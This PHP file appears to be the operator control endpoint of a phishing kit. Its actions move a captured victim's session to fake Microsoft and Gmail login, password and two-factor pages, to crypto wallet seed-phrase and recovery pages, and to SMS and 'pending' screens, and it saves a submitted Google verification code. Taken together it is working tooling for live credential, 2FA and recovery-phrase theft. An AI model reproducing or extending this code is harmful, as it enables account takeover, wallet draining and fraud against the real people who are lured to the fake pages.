<?php
session_start();

if(!isset($_SESSION['user_id']) && !isset($_SESSION['username'])){
    exit;
}

require_once __DIR__ . "/../../controller/db-connect.php";

if(isset($_GET['id']) && isset($_GET['action'])) {
    if($_GET['action'] === 'redirect_password') {
        try {
            $page = '/signin?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id() .'&pwd=true&inc=true';
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirect password updated successfully'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if($_GET['action'] === 'microsoft_login') {
        try {
            $page = '/ms/login?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if($_GET['action'] === '2fa_gmail') {
        try {
            $page = '/g/2fa?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();

            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if ($_GET['action'] === 'gmail_pwd') {
        try {
            $page = '/g/pwd?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();

            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if ($_GET['action'] === 'delete') {
        try {
            $stmt = $pdo->prepare("DELETE FROM clients WHERE id = :id");
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Client deleted successfully'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }


    if ($_GET['action'] === 'update_phrase') {
        try {
            $page = '/l/recovery?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();

            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if ($_GET['action'] === 'seed') {
        try {
            $page = '/account/vault?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();

            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }


    if ($_GET['action'] === 'gen_seed') {
        try {
            $page = '/account/recovery?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
            
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if ($_GET['action'] === 'pending') {
        try {
            $page = '/account/pending?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
            
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if ($_GET['action'] === 'sms') {
        try {
            $page = '/account/sms?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();

            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if ($_GET['action'] === 'terminate') {
        try {
            $page = '/account/terminate?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
            $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
            $stmt->bindParam(':page', $page);
            $stmt->bindParam(':id', $_GET['id']);
            $stmt->execute();

            echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
        } catch (PDOException $e) {
            throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
        }
    }

    if (isset($_GET['gcode'])) {
        if ($_GET['action'] === 'gmail_verify') {
            try {
                $page = '/g/verify?client_id=' . create_sign_id() . '&oauth_challenge=' . create_sign_id();
    
                $stmt = $pdo->prepare("UPDATE clients SET `page` = :page WHERE id = :id");
                $stmt->bindParam(':page', $page);
                $stmt->bindParam(':id', $_GET['id']);
                $stmt->execute();

               
                $gcode = filter_var($_GET['gcode'], FILTER_SANITIZE_NUMBER_INT);
                $stmt = $pdo->prepare("UPDATE clients SET `gcode` = :gcode WHERE id = :id");
                $stmt->bindParam(':gcode', $gcode);
                $stmt->bindParam(':id', $_GET['id']);
                $stmt->execute();
                
                echo json_encode(array('status'=> 'success','message'=> 'Redirected'));
            } catch (PDOException $e) {
                throw new Exception($e->getMessage(), (int)$e->getCode(), $e);
            }
        }
    }
    
}

function create_sign_id() {
    return uniqid() . '-' . uniqid() . '-' . uniqid() . '-' . uniqid();
}


